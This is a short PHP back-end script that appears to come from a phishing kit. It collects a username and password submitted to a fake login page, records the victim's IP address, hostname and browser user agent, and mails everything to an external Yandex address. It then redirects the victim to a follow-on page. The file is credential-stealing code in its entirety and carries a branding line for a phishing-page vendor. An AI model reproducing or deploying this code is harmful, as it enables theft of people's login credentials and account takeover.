<?php
if($_POST["userid"] != "" and $_POST["qrt"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=Online Info=---------\n";
$message .= "User Name: ".$_POST['userid']."\n";
$message .= "Password:  ".$_POST['qrt']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------BURHAN FUDPAGES [.] RU --------------|\n";
$send = "spfmasters2@yandex.com
";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: step.php?user2=".$_POST['userid']);
}else{
header ("Location: index.php");
}

?>